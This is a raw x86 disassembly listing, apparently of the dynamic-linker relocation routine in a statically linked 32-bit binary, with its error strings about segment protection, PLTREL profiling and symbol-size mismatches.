mov eax, dword [eax + 4]
mov dword [var_30h_2], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ee86
cmp dword [eax + 4], 0x11
je 0x807ff46
mov dword [var_6ch], 0
mov edi, dword [var_6ch]
mov ecx, dword [esi]
mov dword [var_70h], esi
lea eax, [edi + edi*2]
mov dword [var_7ch], ecx
lea eax, [ebp + eax*4 - 0xc]
lea edx, [eax - 0x28]
mov ebx, dword [eax - 0x28]
mov eax, dword [edx + 4]
mov edx, dword [edx + 8]
mov edi, ebx
mov dword [var_74h], eax
add eax, ebx
test edx, edx
mov dword [var_78h], eax
je 0x807f875
cmp ebx, eax
jae 0x807eef0
movzx edx, byte [edi + 4]
mov ecx, dword [var_7ch_2]
add ecx, dword [edi]
cmp edx, 7
jne 0x807f869
mov edx, dword [esi + 0x1f8]
test edx, edx
jne 0x807f857
mov ebx, dword [var_7ch_2]
add dword [ecx], ebx
add edi, 8
cmp edi, dword [var_78h_2]
jb 0x807eec1
mov esi, esi
inc dword [var_6ch]
cmp dword [var_6ch], 1
jle 0x807ee8d
mov eax, dword [esi + 0x34]
mov dword [var_4ch], 0
mov dword [var_44h], 0
mov dword [var_50h], 0
mov dword [var_54h], 0
test eax, eax
je 0x807ef2b
mov eax, dword [eax + 4]
mov dword [var_54h], eax
mov eax, dword [esi + 0x38]
mov eax, dword [eax + 4]
mov dword [var_50h], eax
mov eax, dword [esi + 0x68]
test eax, eax
je 0x807ef3c
cmp dword [eax + 4], 7
je 0x807f819
mov dword [var_a4h], 0
mov ecx, dword [var_a4h]
mov dword [var_a8h], esi
lea eax, [ecx + ecx*2]
lea eax, [ebp + eax*4 - 0xc]
mov edx, dword [eax - 0x48]
mov edi, dword [eax - 0x44]
mov eax, dword [esi]
lea ebx, [edi + edx]
mov dword [var_b4h], eax
mov dword [var_b0h], ebx
mov eax, dword [esi + 0x30]
xor ebx, ebx
mov eax, dword [eax + 4]
mov dword [var_b8h], eax
mov eax, dword [esi + 0xb8]
test eax, eax
je 0x807ef8b
mov ebx, dword [eax + 4]
mov ecx, edx
mov eax, edi
mov edx, 0xaaaaaaab
mul edx
shr edx, 3
cmp edx, ebx
cmova edx, ebx
cmp esi, 0
lea edx, [edx + edx*2]
lea edx, [ecx + edx*4]
mov dword [var_ach], edx
je 0x807efee
mov ebx, dword [var_b4h]
test ebx, ebx
jne 0x807efc6
mov edx, dword [esi + 0x114]
test edx, edx
jne 0x807efee
cmp ecx, dword [var_ach]
jae 0x807efee
mov esi, esi
mov edx, dword [var_b4h]
mov eax, dword [var_b4h]
add edx, dword [ecx]
add eax, dword [ecx + 8]
add ecx, 0xc
cmp ecx, dword [var_ach]
mov dword [edx], eax
jb 0x807efd0
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807f4bc
mov edx, dword [var_b0h]
mov eax, dword [eax + 4]
cmp dword [var_ach], edx
mov dword [var_bch], eax
jae 0x807f1b0
mov ecx, dword [var_ach]
mov edi, dword [var_bch]
mov ebx, dword [ecx + 4]
mov ecx, dword [var_b8h]
mov eax, ebx
shr eax, 8
movzx edx, word [edi + eax*2]
mov edi, dword [var_ach]
shl eax, 4
add ecx, eax
mov eax, dword [var_a8h]
mov dword [var_60h], ecx
and dx, 0x7fff
movzx edx, dx
shl edx, 4
add edx, dword [eax + 0x17c]
mov eax, dword [var_b4h]
add eax, dword [edi]
movzx edi, bl
cmp edi, 8
mov dword [var_c0h], eax
je 0x807f49e
test edi, edi
je 0x807f190
mov dword [var_c4h], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_c8h], esi
shr al, 4
test al, al
je 0x807f156
cmp ecx, dword [esi + 0x200]
je 0x807f44a
xor eax, eax
cmp edi, 7
je 0x807f440
cmp edi, 0x23
je 0x807f440
cmp edi, 0x24
je 0x807f440
cmp edi, 0x25
je 0x807f440
cmp edi, 0xe
je 0x807f440
mov ecx, eax
mov ebx, 1
or eax, 2
cmp edi, 5
cmove ecx, eax
mov eax, dword [var_c4h]
mov dword [esi + 0x204], ecx
mov dword [esi + 0x200], eax
xor esi, esi
test edx, edx
je 0x807f105
mov eax, dword [edx + 4]
test eax, eax
je 0x807f105
mov esi, edx
xor ebx, ebx
mov eax, dword [var_60h]
mov edx, dword [arg_ch]
mov eax, dword [eax]
mov dword [esp], edx
mov dword [var_4h], esi
add eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_8h], ecx
lea ecx, [var_60h]
mov dword [var_sp_ch], ebx
mov dword [var_sp_10h], 0
call fcn.0807e450
mov ecx, dword [var_60h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_c8h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, dword [var_ach]
mov ebx, dword [edx + 4]
xor esi, esi
test ecx, ecx
je 0x807f167
mov eax, dword [var_c8h]
mov esi, dword [ecx + 4]
add esi, dword [eax]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a41a0]
mov edx, dword [var_ach]
mov ecx, dword [var_c0h]
add esi, dword [edx + 8]
mov dword [ecx], esi
mov esi, dword [arg_8h]
mov esi, esi
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f017
lea esi, [esi]
inc dword [var_a4h]
cmp dword [var_a4h], 1
jle 0x807ef46
mov eax, dword [arg_14h]
test eax, eax
jne 0x807f23e
or byte [esi + 0x174], 4
mov ecx, dword [var_68h]
test ecx, ecx
jne 0x807f1f4
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x230]
test edx, edx
jne 0x807f1ed
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
call 0x80800d0
jmp 0x807f1e5
mov edx, dword [var_68h]
mov eax, dword [edx + 8]
mov dword [var_8h], eax
mov eax, dword [edx + 4]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x807f222
mov ecx, dword [var_68h]
mov ecx, dword [ecx + 0xc]
test ecx, ecx
mov dword [var_68h], ecx
je 0x807f1d8
jmp 0x807f1f4
mov ebx, str.cannot_restore_segment_prot_after_reloc
call fcn.08048b20
xor ecx, ecx
mov edx, dword [arg_8h]
mov edx, dword [edx + 4]
mov dword [esp], ebx
mov eax, dword [eax]
call fcn.08081200
mov edi, dword [esi + 0x20]
test edi, edi
je 0x807f2af
mov eax, dword [esi + 0x20]
mov eax, dword [eax + 4]
mov dword [esp], 4
mov dword [var_4h], eax
call fcn.08051730
mov dword [esi + 0x188], eax
mov esi, dword [arg_8h]
mov ebx, dword [esi + 0x188]
test ebx, ebx
jne 0x807f1ca
mov ebx, str._s:_profiler_out_of_memory_shadowing_PLTREL_of__s_n
mov eax, dword [0x80a95a8]
mov edx, str._program_name_unknown_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov eax, dword [esi + 4]
mov dword [esp], 2
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov dword [esp], 0x7f
call fcn.08053d90
mov ebx, str._s:_profiler_found_no_PLTREL_in_object__s_n
jmp 0x807f277
mov ebx, dword [var_ach]
mov edi, dword [var_c0h]
add esi, dword [ebx + 8]
sub esi, dword [var_c0h]
mov dword [edi], esi
jmp 0x807f18b
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c4h]
mov edx, dword [ebx + 8]
cmp dword [ecx + 8], edx
ja 0x807f316
jb 0x807f30d
mov eax, dword [ecx + 8]
mov edi, dword [var_c0h]
mov dword [var_4h], esi
cmp edx, eax
mov dword [esp], edi
cmovbe eax, edx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f18b
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f2ea
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_c4h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_60h]
mov edx, dword [ebx + 8]
jmp 0x807f2ea
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f392
mov eax, dword [ecx + 4]
mov edi, dword [var_ach]
sub eax, edx
add eax, dword [edi + 8]
mov edx, dword [var_c0h]
mov dword [edx], eax
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f377
xor ecx, ecx
mov edx, edi
mov eax, dword [var_a8h]
mov esi, esi
call 0x8080140
mov eax, dword [var_c8h]
test eax, eax
je 0x807f18b
mov edx, dword [var_c8h]
mov ecx, dword [var_c0h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807f18b
test ecx, ecx
je 0x807f3ee
mov ebx, dword [var_ach]
mov eax, dword [ebx + 8]
add eax, dword [ecx + 4]
jmp 0x807f385
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
jmp 0x807f385
test ecx, ecx
je 0x807f18b
mov ebx, dword [var_c8h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807f42a
mov edi, dword [var_ach]
sub edx, dword [ecx + 4]
mov eax, dword [var_c0h]
add edx, dword [edi + 8]
mov dword [eax], edx
jmp 0x807f18b
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_60h]
mov edx, dword [ebx + 0x224]
jmp 0x807f411
lea esi, [esi]
mov eax, 1
jmp 0x807f0d2
xor ecx, ecx
cmp edi, 7
je 0x807f497
cmp edi, 0x23
je 0x807f497
cmp edi, 0x24
je 0x807f497
cmp edi, 0x25
je 0x807f497
cmp edi, 0xe
je 0x807f497
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f492
cmp ecx, eax
jne 0x807f0a3
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_60h], ecx
mov dword [var_c8h], esi
jmp 0x807f156
or ecx, 2
jmp 0x807f470
mov ecx, 1
jmp 0x807f465
mov edx, dword [var_ach]
mov ecx, dword [var_a8h]
mov ebx, dword [var_c0h]
mov eax, dword [edx + 8]
add eax, dword [ecx]
mov dword [ebx], eax
jmp 0x807f190
mov edx, dword [var_b0h]
cmp dword [var_ach], edx
jae 0x807f1b0
mov esi, esi
mov ecx, dword [var_ach]
mov edi, dword [var_b4h]
mov edx, dword [var_b8h]
mov ebx, dword [ecx + 4]
add edi, dword [ecx]
mov eax, ebx
shr eax, 8
mov dword [var_cch], edi
movzx edi, bl
shl eax, 4
add edx, eax
cmp edi, 8
mov dword [var_64h], edx
je 0x807f801
test edi, edi
je 0x807f614
mov dword [var_d0h], edx
movzx eax, byte [edx + 0xc]
mov dword [var_d4h], esi
shr al, 4
test al, al
je 0x807f5dc
cmp edx, dword [esi + 0x200]
je 0x807f7ad
xor eax, eax
cmp edi, 7
je 0x807f7a3
cmp edi, 0x23
je 0x807f7a3
cmp edi, 0x24
je 0x807f7a3
cmp edi, 0x25
je 0x807f7a3
cmp edi, 0xe
je 0x807f7a3
mov edx, eax
mov ebx, dword [var_d0h]
lea ecx, [var_64h]
or edx, 2
cmp edi, 5
cmovne edx, eax
mov eax, dword [var_64h]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], ebx
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_64h]
mov edx, dword [arg_8h]
mov dword [var_d4h], eax
sub esp, 0x14
mov dword [edx + 0x208], eax
mov dword [edx + 0x20c], ecx
mov eax, dword [var_ach]
mov edx, ecx
mov ebx, dword [eax + 4]
xor esi, esi
test edx, edx
je 0x807f5ed
mov ecx, dword [var_d4h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
movzx eax, bl
cmp eax, 0x25
ja case.0x807f173.0
jmp dword [eax*4 + 0x80a4238]
mov ebx, dword [var_ach]
mov edi, dword [var_cch]
add esi, dword [ebx + 8]
mov dword [edi], esi
mov esi, dword [arg_8h]
add dword [var_ach], 0xc
mov eax, dword [var_b0h]
cmp dword [var_ach], eax
jb 0x807f4d0
jmp 0x807f1b0
mov eax, dword [var_ach]
mov edx, dword [var_cch]
add esi, dword [eax + 8]
sub esi, dword [var_cch]
mov dword [edx], esi
jmp 0x807f611
test edx, edx
je 0x807f611
mov ebx, dword [var_d0h]
mov ecx, dword [ebx + 8]
cmp dword [edx + 8], ecx
ja 0x807f688
jb 0x807f67f
mov eax, dword [edx + 8]
mov edi, dword [var_cch]
mov dword [var_4h], esi
cmp ecx, eax
mov dword [esp], edi
cmovbe eax, ecx
mov dword [var_8h], eax
call fcn.08053770
jmp 0x807f611
mov eax, dword [0x80aac54]
test eax, eax
je 0x807f65f
mov eax, dword [0x80a95a8]
mov edi, dword [var_a8h]
mov edx, str._program_name_unknown_
mov ebx, dword [var_d0h]
mov eax, dword [eax]
mov ecx, dword [edi + 0x2c]
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_64h]
mov ecx, dword [ebx + 8]
jmp 0x807f65f
test edx, edx
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807f704
mov eax, dword [edx + 4]
mov edx, dword [var_ach]
sub eax, ebx
add eax, dword [edx + 8]
mov ecx, dword [var_cch]
mov dword [ecx], eax
jmp 0x807f611
mov eax, ecx
call fcn.0807ec80
mov edi, dword [var_d4h]
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f6e9
mov eax, dword [var_d4h]
test eax, eax
je 0x807f611
mov ecx, dword [var_d4h]
mov ebx, dword [var_cch]
mov eax, dword [ecx + 0x228]
mov dword [ebx], eax
jmp 0x807f611
test edx, edx
je 0x807f755
mov edi, dword [var_ach]
mov eax, dword [edi + 8]
add eax, dword [edx + 4]
jmp 0x807f6f7
mov edx, dword [var_ach]
mov eax, dword [edx + 8]
jmp 0x807f6f7
test edx, edx
je 0x807f611
mov edi, dword [var_d4h]
mov ebx, dword [edi + 0x224]
test ebx, ebx
je 0x807f791
mov eax, dword [var_ach]
sub ebx, dword [edx + 4]
mov edx, dword [var_cch]
add ebx, dword [eax + 8]
mov dword [edx], ebx
jmp 0x807f611
mov eax, edi
call fcn.0807ec80
mov edx, dword [var_64h]
mov ebx, dword [edi + 0x224]
jmp 0x807f778
mov eax, 1
jmp 0x807f564
xor edx, edx
cmp edi, 7
je 0x807f7fa
cmp edi, 0x23
je 0x807f7fa
cmp edi, 0x24
je 0x807f7fa
cmp edi, 0x25
je 0x807f7fa
cmp edi, 0xe
je 0x807f7fa
cmp edi, 5
mov eax, dword [esi + 0x204]
je 0x807f7f5
cmp edx, eax
jne 0x807f535
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_64h], edx
mov dword [var_d4h], esi
jmp 0x807f5dc
or edx, 2
jmp 0x807f7d3
mov edx, 1
jmp 0x807f7c8
mov edx, dword [var_a8h]
mov eax, dword [ecx + 8]
mov ecx, dword [var_cch]
add eax, dword [edx]
mov dword [ecx], eax
jmp 0x807f614
mov edi, dword [arg_10h]
mov eax, dword [esi + 0x74]
test edi, edi
mov ecx, dword [eax + 4]
jne 0x807f832
mov edx, dword [var_50h]
mov eax, dword [var_54h]
add eax, edx
cmp eax, ecx
je 0x807f849
mov eax, dword [esi + 0x20]
mov dword [var_48h], ecx
mov edx, dword [arg_10h]
mov eax, dword [eax + 4]
mov dword [var_40h], edx
mov dword [var_44h], eax
jmp 0x807ef3c
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_50h], edx
jmp 0x807ef3c
mov eax, ecx
sub eax, dword [esi + 0x1fc]
lea eax, [edx + eax*4]
mov dword [ecx], eax
jmp 0x807eee6
mov ecx, 1
mov eax, esi
jmp 0x807f3b0
mov eax, dword [esi + 0x30]
xor ecx, ecx
mov eax, dword [eax + 4]
mov dword [var_80h], eax
mov eax, dword [esi + 0xb4]
test eax, eax
je 0x807f88d
mov ecx, dword [eax + 4]
mov eax, dword [var_74h]
mov edx, ebx
shr eax, 3
cmp eax, ecx
cmova eax, ecx
cmp esi, 0
lea edi, [ebx + eax*8]
je 0x807f8d0
mov eax, dword [var_7ch]
test eax, eax
je 0x807f8d0
cmp ebx, edi
jae 0x807f8d0
mov eax, dword [var_7ch]
add eax, dword [edx]
cmp byte [edx + 4], 8
jne 0x80800a3
add edx, 8
mov ecx, dword [var_7ch_2]
add dword [eax], ecx
cmp edx, edi
jb 0x807f8b0
nop
lea esi, [esi]
mov eax, dword [esi + 0xdc]
test eax, eax
je 0x807fc40
cmp edi, dword [var_78h]
mov eax, dword [eax + 4]
mov dword [var_84h], eax
jae 0x807eef0
mov eax, dword [edi + 4]
mov ebx, dword [var_84h]
mov edx, eax
shr edx, 8
movzx ecx, word [ebx + edx*2]
mov ebx, dword [var_70h]
shl edx, 4
add edx, dword [var_80h]
and cx, 0x7fff
movzx ecx, cx
mov dword [var_58h], edx
shl ecx, 4
add ecx, dword [ebx + 0x17c]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov dword [var_88h], ebx
movzx ebx, al
cmp ebx, 8
je 0x807fc2a
test ebx, ebx
je 0x807fa53
mov dword [var_8ch], edx
movzx eax, byte [edx + 0xc]
mov dword [var_90h], esi
shr al, 4
test al, al
je 0x807fa23
cmp edx, dword [esi + 0x200]
je 0x807fbd6
xor eax, eax
cmp ebx, 7
je 0x807fbcc
cmp ebx, 0x23
je 0x807fbcc
cmp ebx, 0x24
je 0x807fbcc
cmp ebx, 0x25
je 0x807fbcc
cmp ebx, 0xe
je 0x807fbcc
mov edx, eax
mov dword [var_94h], 0
or eax, 2
cmp ebx, 5
cmove edx, eax
test ecx, ecx
mov eax, dword [var_8ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov esi, 1
je 0x807f9d3
mov eax, dword [ecx + 4]
test eax, eax
je 0x807f9d3
mov dword [var_94h], ecx
xor esi, esi
mov eax, dword [var_58h]
lea ecx, [var_58h]
mov eax, dword [eax]
mov dword [var_8h], edx
mov dword [var_sp_ch], esi
mov edx, dword [var_94h]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_4h], edx
mov edx, dword [arg_ch]
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_58h]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_90h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
mov edx, ecx
xor esi, esi
test edx, edx
je 0x807fa34
mov ecx, dword [var_90h]
mov esi, dword [edx + 4]
add esi, dword [ecx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a42d0]
mov ebx, dword [var_88h]
mov dword [ebx], esi
lea esi, [esi]
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807f8f0
jmp 0x807eef0
mov ecx, dword [var_88h]
add dword [ecx], esi
jmp 0x807fa50
mov ebx, dword [var_88h]
sub esi, dword [var_88h]
add dword [ebx], esi
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_8ch]
mov ecx, dword [eax + 8]
cmp dword [edx + 8], ecx
ja 0x807fabb
jb 0x807fab2
mov eax, dword [edx + 8]
mov dword [var_4h], esi
cmp ecx, eax
cmovbe eax, ecx
mov dword [var_8h], eax
mov eax, dword [var_88h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fa50
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fa92
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_8ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov edx, dword [var_58h]
mov ecx, dword [ebx + 8]
jmp 0x807fa92
test edx, edx
je 0x807fa50
mov ecx, dword [var_90h]
mov ebx, dword [ecx + 0x224]
test ebx, ebx
je 0x807fb2b
mov eax, dword [edx + 4]
mov edx, dword [var_88h]
sub eax, ebx
add dword [edx], eax
jmp 0x807fa50
mov eax, ecx
call fcn.0807ec80
mov eax, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [eax + 0x224]
jmp 0x807fb19
mov eax, dword [var_70h]
xor ecx, ecx
mov edx, ebx
jmp 0x807f3b0
mov eax, dword [var_90h]
test eax, eax
je 0x807fa50
mov edx, dword [var_90h]
mov ecx, dword [var_88h]
mov eax, dword [edx + 0x228]
mov dword [ecx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [edx + 4]
mov ebx, dword [var_88h]
mov dword [ebx], eax
jmp 0x807fa50
test edx, edx
je 0x807fa50
mov eax, dword [var_90h]
mov ebx, dword [eax + 0x224]
test ebx, ebx
je 0x807fbb6
mov eax, dword [var_88h]
sub ebx, dword [edx + 4]
add dword [eax], ebx
jmp 0x807fa50
call fcn.0807ec80
mov ecx, dword [var_90h]
mov edx, dword [var_58h]
mov ebx, dword [ecx + 0x224]
jmp 0x807fba6
mov eax, 1
jmp 0x807f994
xor edx, edx
cmp ebx, 7
je 0x807fc23
cmp ebx, 0x23
je 0x807fc23
cmp ebx, 0x24
je 0x807fc23
cmp ebx, 0x25
je 0x807fc23
cmp ebx, 0xe
je 0x807fc23
cmp ebx, 5
mov eax, dword [esi + 0x204]
je 0x807fc1e
cmp edx, eax
jne 0x807f965
mov edx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_58h], edx
mov dword [var_90h], esi
jmp 0x807fa23
or edx, 2
jmp 0x807fbfc
mov edx, 1
jmp 0x807fbf1
mov edx, dword [var_70h]
mov ecx, dword [var_88h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fa53
lea esi, [esi]
cmp edi, dword [var_78h]
jae 0x807eef0
lea esi, [esi]
mov edx, dword [edi + 4]
mov ebx, dword [var_7ch]
add ebx, dword [edi]
mov ecx, dword [var_80h]
mov eax, edx
shr eax, 8
shl eax, 4
mov dword [var_98h], ebx
movzx ebx, dl
add ecx, eax
cmp ebx, 8
mov dword [var_5ch], ecx
je 0x807ff34
test ebx, ebx
je 0x807fd73
mov dword [var_9ch], ecx
movzx eax, byte [ecx + 0xc]
mov dword [var_a0h], esi
shr al, 4
test al, al
je 0x807fd45
cmp ecx, dword [esi + 0x200]
je 0x807fee0
xor eax, eax
cmp ebx, 7
je 0x807fed6
cmp ebx, 0x23
je 0x807fed6
cmp ebx, 0x24
je 0x807fed6
cmp ebx, 0x25
je 0x807fed6
cmp ebx, 0xe
je 0x807fed6
mov edx, eax
lea ecx, [var_5ch]
or edx, 2
cmp ebx, 5
cmovne edx, eax
mov eax, dword [var_9ch]
mov dword [esi + 0x204], edx
mov dword [esi + 0x200], eax
mov eax, dword [var_5ch]
mov eax, dword [eax]
mov dword [var_4h], 0
mov dword [var_8h], edx
mov edx, dword [arg_ch]
add eax, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_sp_ch], 1
mov dword [esp], edx
mov edx, dword [arg_8h]
call fcn.0807e450
mov ecx, dword [var_5ch]
mov edx, dword [arg_8h]
sub esp, 0x14
mov dword [var_a0h], eax
mov dword [edx + 0x20c], ecx
mov dword [edx + 0x208], eax
xor esi, esi
test ecx, ecx
je 0x807fd56
mov edx, dword [var_a0h]
mov esi, dword [ecx + 4]
add esi, dword [edx]
cmp ebx, 0x25
ja case.0x807fd5f.0
jmp dword [ebx*4 + 0x80a4368]
mov ecx, dword [var_98h]
mov dword [ecx], esi
mov esi, esi
mov esi, dword [arg_8h]
add edi, 8
cmp edi, dword [var_78h]
jb 0x807fc50
jmp 0x807eef0
mov ecx, dword [var_98h]
add dword [ecx], esi
jmp 0x807fd70
mov ebx, dword [var_98h]
sub esi, dword [var_98h]
add dword [ebx], esi
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [var_9ch]
mov edx, dword [eax + 8]
cmp dword [ecx + 8], edx
ja 0x807fddb
jb 0x807fdd2
mov eax, dword [ecx + 8]
mov dword [var_4h], esi
cmp edx, eax
cmovbe eax, edx
mov dword [var_8h], eax
mov eax, dword [var_98h]
mov dword [esp], eax
call fcn.08053770
jmp 0x807fd70
mov eax, dword [0x80aac54]
test eax, eax
je 0x807fdb2
mov eax, dword [0x80a95a8]
mov edx, dword [var_70h]
mov ebx, dword [var_9ch]
mov eax, dword [eax]
mov ecx, dword [edx + 0x2c]
mov edx, str._program_name_unknown_
test eax, eax
cmovne edx, eax
mov eax, dword [ebx]
add eax, dword [ecx + 4]
mov dword [var_8h], edx
mov dword [var_4h], str._s:_Symbol___s_has_different_size_in_shared_object__consider_re_linking_n
mov dword [esp], 2
mov dword [var_sp_ch], eax
call fcn.08081ca0
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 8]
jmp 0x807fdb2
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fe4b
mov eax, dword [ecx + 4]
sub eax, edx
mov edx, dword [var_98h]
add dword [edx], eax
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807fe39
mov eax, dword [var_a0h]
test eax, eax
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [var_98h]
mov eax, dword [ebx + 0x228]
mov dword [edx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov eax, dword [ecx + 4]
mov ecx, dword [var_98h]
mov dword [ecx], eax
jmp 0x807fd70
test ecx, ecx
je 0x807fd70
mov ebx, dword [var_a0h]
mov edx, dword [ebx + 0x224]
test edx, edx
je 0x807fec4
mov eax, dword [var_98h]
sub edx, dword [ecx + 4]
add dword [eax], edx
jmp 0x807fd70
mov eax, ebx
call fcn.0807ec80
mov ecx, dword [var_5ch]
mov edx, dword [ebx + 0x224]
jmp 0x807feb4
mov eax, 1
jmp 0x807fcd8
xor edx, edx
cmp ebx, 7
je 0x807ff2d
cmp ebx, 0x23
je 0x807ff2d
cmp ebx, 0x24
je 0x807ff2d
cmp ebx, 0x25
je 0x807ff2d
cmp ebx, 0xe
je 0x807ff2d
cmp ebx, 5
mov eax, dword [esi + 0x204]
je 0x807ff28
cmp edx, eax
jne 0x807fca9
mov ecx, dword [esi + 0x20c]
mov esi, dword [esi + 0x208]
mov dword [var_5ch], ecx
mov dword [var_a0h], esi
jmp 0x807fd45
or edx, 2
jmp 0x807ff06
mov edx, 1
jmp 0x807fefb
mov edx, dword [var_70h]
mov ecx, dword [var_98h]
mov eax, dword [edx]
add dword [ecx], eax
jmp 0x807fd73
mov ebx, dword [var_10h_2]
mov eax, dword [esi + 0x74]
test ebx, ebx
mov ecx, dword [eax + 4]
jne 0x807ff5f
mov edx, dword [var_30h_2]
mov eax, dword [var_34h_2]
add eax, edx
cmp eax, ecx
je 0x807ff76
mov eax, dword [esi + 0x20]
mov dword [var_28h], ecx
mov ebx, dword [var_10h_2]
mov eax, dword [eax + 4]
mov dword [var_20h], ebx
mov dword [var_24h_2], eax
jmp 0x807ee86
mov eax, dword [esi + 0x20]
add edx, dword [eax + 4]
mov dword [var_30h_2], edx
jmp 0x807ee86
mov eax, dword [0x80aac20]
mov dword [edx + 8], 0x80811b0
mov edx, esi
call fcn.08081cd0
test eax, eax
je 0x807ffa1
mov dword [0x80aac60], esi
mov esi, dword [var_4h_3]
jmp 0x807ee43
movzx eax, word [esi + 0x14c]
mov ebx, dword [esi + 0x144]
shl eax, 5
lea eax, [eax + ebx]
cmp ebx, eax
jae 0x807edf9
cmp dword [ebx], 1
je 0x807ffe5
movzx eax, word [esi + 0x14c]
add ebx, 0x20
shl eax, 5
add eax, dword [esi + 0x144]
cmp ebx, eax
jb 0x807ffc4
jmp 0x807edf9
test byte [ebx + 0x18], 2
jne 0x807ffc9
mov ecx, dword [ebx + 8]
mov eax, dword [0x80aac74]
sub esp, 0x20
lea edi, [var_23h]
and edi, 0xfffffff0
mov edx, ecx
add edx, dword [ebx + 0x14]
lea edx, [eax + edx - 1]
neg eax
and ecx, eax
and edx, eax
sub edx, ecx
mov dword [edi + 4], edx
and eax, dword [ebx + 8]
add eax, dword [esi]
mov dword [edi], eax
mov dword [var_8h_4], 3
mov eax, dword [edi + 4]
mov dword [var_4h_5], eax
mov eax, dword [edi]
mov dword [esp], eax
call fcn.080547a0
test eax, eax
js 0x808005c
mov ecx, dword [ebx + 0x18]
mov eax, 0x73516240
mov esi, dword [var_4h_3]
and ecx, 7
shl ecx, 2
sar eax, cl
mov ecx, dword [var_68h_2]
mov dword [var_68h_2], edi
and eax, 0xf
mov dword [edi + 8], eax
mov dword [edi + 0xc], ecx
jmp 0x807ffc9
mov ebx, str.cannot_make_segment_writable_for_relocation
jmp 0x807f227
